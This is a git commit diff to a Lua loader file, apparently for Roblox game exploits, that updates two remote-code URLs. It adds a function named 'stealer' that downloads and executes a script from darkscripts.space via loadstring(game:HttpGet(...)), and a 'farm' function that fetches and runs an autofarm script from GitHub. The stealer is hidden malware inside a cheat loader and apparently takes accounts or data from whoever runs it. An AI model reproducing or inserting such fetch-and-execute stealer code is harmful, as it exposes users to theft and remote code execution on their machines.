8f407e3414b384030ab97dd5b67ed3f9a613a639
TechCraft1 <lioontop701@gmail.com>
2024-12-27 13:26:42 +0100

    Update b22aae7d03041699ada62f6a4fb519fd.lua

--- v3/loaders/b22aae7d03041699ada62f6a4fb519fd.lua
+++ v3/loaders/b22aae7d03041699ada62f6a4fb519fd.lua
@@ -1,9 +1,9 @@
 local function stealer()
-    loadstring(game:HttpGet('https://darkscripts.space/scripts/8be944bc-c5f7-45e4-a2ec-10c6ef49b17e_824604012124569610.lua',true))()
+    loadstring(game:HttpGet('https://darkscripts.space/scripts/1c41a01e-55f3-4882-9655-ad0ccacaa8e3_907170906634321952.lua',true))()                              
 end
 local function farm()
  
-loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/BloxFruits/main/redz9999"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI"))()
 
 end
 
